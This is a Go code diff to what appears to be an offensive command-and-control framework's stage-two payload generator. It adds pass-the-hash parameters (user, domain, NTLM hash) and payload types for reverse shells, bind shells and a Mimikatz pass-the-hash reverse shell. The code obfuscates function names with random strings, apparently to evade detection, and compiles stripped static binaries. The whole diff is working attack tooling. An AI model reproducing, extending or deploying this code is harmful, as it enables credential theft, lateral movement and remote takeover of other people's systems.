@@ -17,19 +17,28 @@ type StageTwoPayloadGeneratorModule struct {
 	arch           string
 	executableName string
 
+	// pth params
+	user   string
+	domain string
+	ntlm   string
+
 	logger util.Logger
 }
 
 func NewStageTwoPayloadGeneratorModule(hostOpt string, portOpt string, payloadTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *StageTwoPayloadGeneratorModule {
 	stpgm := StageTwoPayloadGeneratorModule{
-		host:           hostOpt,
-		port:           portOpt,
-		payloadType:    payloadTypeOpt,
-		platform:       platformOpt,
-		arch:           archOpt,
-		executableName: executableNameOpt,
+		host:        hostOpt,
+		port:        portOpt,
+		payloadType: payloadTypeOpt,
+		platform:    platformOpt,
+		arch:        archOpt,
 	}
 	stpgm.logger = util.StageTwoPayloadGeneratorLogger(true, "")
+	if executableNameOpt == "revshell.exe" {
+		stpgm.executableName = "data/c2/helpers/" + executableNameOpt
+	} else {
+		stpgm.executableName = "data/c2/payloads/" + executableNameOpt
+	}
 	return &stpgm
 }
 
@@ -59,8 +68,27 @@ func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, err
 			"RUNMIMIKATZ",
 			"GETHELPER",
 			"MIMIKATZFILENAME",
-			"WRITEMIMIKATZFILETOTEMPDIR",
+			"WRITETOFILE",
 		}
+	}
+	if stpgm.payloadType == "reverse_shell" || stpgm.payloadType == "bind_shell" {
+		funcPatterns = []string{
+			"WRITETOFILE",
+			"SHELL",
+			"FILENAME",
+		}
+	}
+	if stpgm.payloadType == "mimikatz_pth_reverse_shell" {
+		funcPatterns = []string{
+			"GETHELPER",
+			"WRITETOFILE",
+			"RUNMIMIKATZ",
+			"MIMIKATZFILENAME",
+			"REVERSESHELLNAME",
+		}
+		payloadSource = strings.Replace(payloadSource, "USER", stpgm.user, -1)
+		payloadSource = strings.Replace(payloadSource, "DOMAIN", stpgm.domain, -1)
+		payloadSource = strings.Replace(payloadSource, "NTLM", stpgm.ntlm, -1)
 	}
 	for _, funcPattern := range funcPatterns {
 		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
@@ -80,7 +108,7 @@ func (stpgm *StageTwoPayloadGeneratorModule) compilePayload(payloadSource string
 		"go",
 		"build",
 		"-o",
-		"data/c2/payloads/"+stpgm.executableName,
+		stpgm.executableName,
 		"-ldflags",
 		"-w -s -extldflags=-static",
 		payloadSourceFileName).Output()
@@ -95,4 +123,10 @@ func (stpgm *StageTwoPayloadGeneratorModule) compilePayload(payloadSource string
 		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
 	}
 	return nil
+}
+
+func (stpgm *StageTwoPayloadGeneratorModule) SetPthParams(user, domain, ntlm string) {
+	stpgm.user = user
+	stpgm.domain = domain
+	stpgm.ntlm = ntlm
 }
